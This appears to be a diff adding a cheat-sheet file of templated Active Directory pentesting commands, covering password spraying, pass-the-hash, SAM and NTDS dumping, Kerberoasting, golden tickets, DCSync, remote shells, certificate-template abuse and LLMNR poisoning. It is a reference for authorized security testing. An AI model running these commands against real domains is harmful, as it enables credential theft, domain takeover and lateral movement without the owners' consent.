@@ -1,0 +1,210 @@
+;; Active Directory / Windows domain pentesting.
+;; Tool names match the Kali package binaries (netexec, certipy-ad, impacket-*).
+
+%tool netexec
+%cat command
+%tags ad,windows
+
+@ Check credentials against every host || netexec smb {{target}} -u {{user}} -p {{pass}}
+~ smb,spray
+? crackmapexec cme login check valid creds
+Exit-code marker on the far right of each line: `+` valid, `(Pwn3d!)` local admin. `{{target}}` can be a CIDR, a file with `-u users.txt -p passwords.txt`, or a single IP.
+
+@ Password spray a user list || netexec smb {{target}} -u {{userlist}} -p '{{pass}}' --continue-on-success
+~ spray,bruteforce
+? spray one password many users avoid lockout
+
+@ Pass-the-hash || netexec smb {{target}} -u {{user}} -H {{hash}}
+~ pth,hash
+? ntlm hash login no password
+
+@ Kerberos auth with a ccache ticket || netexec smb {{target}} -u {{user}} -k --use-kcache
+~ kerberos,ticket
+
+@ List shares and access || netexec smb {{target}} -u {{user}} -p {{pass}} --shares
+
+@ Spider a share for interesting files || netexec smb {{target}} -u {{user}} -p {{pass}} -M spider_plus -o DOWNLOAD_FLAG=true
+~ loot
+
+@ Dump SAM / LSA secrets || netexec smb {{target}} -u {{user}} -p {{pass}} --sam
+~ dump,creds
+! writes local credential material to disk — handle the loot carefully
+
+@ Dump NTDS.dit from a DC || netexec smb {{target}} -u {{user}} -p {{pass}} --ntds
+~ dcsync,dump
+! dumps every domain account's hash — noisy and heavily logged
+
+@ Enumerate logged-on users || netexec smb {{target}} -u {{user}} -p {{pass}} --loggedon-users
+
+@ RID brute-force (no creds, null session) || netexec smb {{target}} -u '' -p '' --rid-brute
+~ enum,anonymous
+
+@ Check LDAP and pull domain info || netexec ldap {{target}} -u {{user}} -p {{pass}} --users
+
+@ List available protocols and modules || netexec smb -L
+~ help,modules
+
+;; ── Kerberos-only pre-auth attacks ──────────────────────────────────────
+
+%tool kerbrute
+%tags ad,kerberos
+
+@ Enumerate valid usernames (no auth, no lockout risk) || kerbrute userenum -d {{domain}} --dc {{target}} {{userlist}}
+~ enum,users
+? kerberos pre-auth user discovery stealthy
+Abuses that Kerberos answers differently for a valid vs. invalid principal, so it never sends a bad password and won't trigger lockout policy. Not on Kali by default: `go install github.com/ropnop/kerbrute@latest`.
+
+@ Password-spray discovered users || kerbrute passwordspray -d {{domain}} --dc {{target}} {{userlist}} '{{pass}}'
+~ spray
+
+@ Brute a single user's password || kerbrute bruteuser -d {{domain}} --dc {{target}} {{wordlist}} {{user}}
+
+;; ── AS-REP / Kerberoasting (impacket) ───────────────────────────────────
+
+%tool impacket-GetNPUsers
+%tags ad,kerberos,impacket
+
+@ AS-REP roast (no creds needed if pre-auth is off) || impacket-GetNPUsers {{domain}}/ -usersfile {{userlist}} -no-pass -format hashcat
+~ asreproast
+? users without kerberos preauthentication
+Crack the output with `hashcat -m 18200`.
+
+@ AS-REP roast with valid creds (also finds the flag) || impacket-GetNPUsers {{domain}}/{{user}}:{{pass}} -request
+
+%tool impacket-GetUserSPNs
+@ Kerberoast every SPN account || impacket-GetUserSPNs {{domain}}/{{user}}:{{pass}} -request -outputfile spns.hashcat
+~ kerberoast
+? service accounts service principal names
+Crack with `hashcat -m 13100`. Service accounts often carry weak, never-rotated passwords.
+
+%tool impacket-getTGT
+@ Request and cache a TGT || impacket-getTGT {{domain}}/{{user}}:{{pass}}
+~ ticket
+Writes a `.ccache` file; `export KRB5CCNAME=user.ccache` before using `-k` with other impacket/netexec tools.
+
+%tool impacket-ticketer
+@ Forge a golden ticket || impacket-ticketer -nthash {{hash}} -domain-sid {{sid}} -domain {{domain}} {{user}}
+~ goldenticket,persistence
+! full-domain persistence — authorized engagements only, and note it for the report
+
+;; ── Credential dumping / lateral movement (impacket) ────────────────────
+
+%tool impacket-secretsdump
+@ Dump local SAM + cached creds remotely || impacket-secretsdump {{domain}}/{{user}}:{{pass}}@{{target}}
+~ dump,lateral
+? dump hashes ntlm local admin
+
+@ DCSync the whole domain (via a DA account) || impacket-secretsdump {{domain}}/{{user}}:{{pass}}@{{target}} -just-dc
+~ dcsync
+! full domain hash dump — extremely noisy, extremely sensitive output
+
+@ Dump from an offline registry hive || impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+%tool impacket-wmiexec
+@ Semi-interactive shell over WMI || impacket-wmiexec {{domain}}/{{user}}:{{pass}}@{{target}}
+~ shell,lateral
+? execute command remotely windows
+
+@ wmiexec with a hash, no password || impacket-wmiexec -hashes {{hash}} {{domain}}/{{user}}@{{target}}
+
+%tool impacket-psexec
+@ PsExec-style SYSTEM shell (drops a service binary) || impacket-psexec {{domain}}/{{user}}:{{pass}}@{{target}}
+~ shell,lateral
+! creates and starts a remote service — visible to EDR and in event logs
+
+%tool impacket-smbclient
+@ Interactive SMB client || impacket-smbclient {{domain}}/{{user}}:{{pass}}@{{target}}
+~ shares
+
+;; ── AD CS abuse ──────────────────────────────────────────────────────────
+
+%tool certipy-ad
+%tags ad,adcs,certificates
+
+@ Find vulnerable certificate templates || certipy-ad find -u {{user}}@{{domain}} -p {{pass}} -dc-ip {{target}} -vulnerable -stdout
+~ enum
+? esc1 esc8 misconfigured templates
+
+@ Request a certificate (ESC1-style) || certipy-ad req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca}} -template {{template}} -upn administrator@{{domain}}
+~ esc1
+
+@ Authenticate with the resulting cert to get an NT hash || certipy-ad auth -pfx {{pfx}} -domain {{domain}}
+~ auth
+
+@ Coerce and relay to the web enrollment endpoint (ESC8) || certipy-ad relay -target 'http://{{target}}/certsrv/certfnsh.asp'
+~ esc8,relay
+
+@ Shadow Credentials attack (no cert templates needed) || certipy-ad shadow auto -u {{user}}@{{domain}} -p {{pass}} -account {{target_user}}
+~ shadowcredentials
+
+;; ── Legacy / classic enumeration ─────────────────────────────────────────
+
+%tool smbclient
+%tags smb,enum
+
+@ Anonymous share listing || smbclient -L //{{target}}/ -N
+~ null,anonymous
+
+@ Connect to a share || smbclient //{{target}}/{{share}} -U {{user}}
+
+@ Recursively pull a whole share || smbclient //{{target}}/{{share}} -U {{user}} -c 'prompt off; recurse on; mget *'
+~ loot
+
+%tool smbmap
+@ Enumerate share permissions || smbmap -H {{target}} -u {{user}} -p {{pass}}
+~ perms
+
+@ Walk a share and list files recursively || smbmap -H {{target}} -u {{user}} -p {{pass}} -R {{share}} --dir-only
+
+%tool rpcclient
+@ Null session RPC enumeration || rpcclient -U '' -N {{target}}
+~ null
+
+@ Enumerate domain users via RPC || rpcclient -U {{user}}%{{pass}} {{target}} -c 'enumdomusers'
+
+%tool enum4linux
+@ All-in-one SMB/RPC enumeration || enum4linux -a {{target}}
+~ enum,legacy
+Superseded by `enum4linux-ng` where available (`-A` for the same "everything" sweep, cleaner output).
+
+%tool ldapsearch
+%tags ldap,enum
+
+@ Anonymous LDAP dump || ldapsearch -x -H ldap://{{target}} -b "dc={{domain_dc}}"
+~ null
+`dc=corp,dc=local` style base for a `domain_dc` of `corp.local`.
+
+@ Authenticated LDAP search for a user attribute || ldapsearch -x -H ldap://{{target}} -D "{{user}}@{{domain}}" -w {{pass}} -b "dc={{domain_dc}}" "(sAMAccountName={{target_user}})"
+
+;; ── Credential relay / capture ───────────────────────────────────────────
+
+%tool responder
+%tags relay,llmnr,mitm
+
+@ Passively poison LLMNR/NBT-NS/mDNS || responder -I {{iface}}
+~ poison
+? capture ntlmv2 hashes broadcast
+Captured hashes land in `/usr/share/responder/logs/`. Crack with `hashcat -m 5600`.
+
+@ Analyze-only, no poisoning (recon first) || responder -I {{iface}} -A
+~ analyze
+
+%tool evil-winrm
+%tags winrm,shell
+
+@ WinRM shell with a password || evil-winrm -i {{target}} -u {{user}} -p {{pass}}
+~ shell
+? psremoting powershell remote
+
+@ WinRM shell with an NTLM hash || evil-winrm -i {{target}} -u {{user}} -H {{hash}}
+
+@ Load PowerShell scripts / upload EXEs from a local dir || evil-winrm -i {{target}} -u {{user}} -p {{pass}} -s {{scripts_dir}} -e {{exe_dir}}
+~ upload
+
+%tool bloodhound-python
+%tags bloodhound,collection
+
+@ Collect everything for BloodHound || bloodhound-python -u {{user}} -p {{pass}} -d {{domain}} -ns {{target}} -c All
+~ collect
+? ad attack path graph ingest
+Zips the JSON output for drag-and-drop into BloodHound CE. `-c DCOnly` avoids touching every computer when stealth matters.
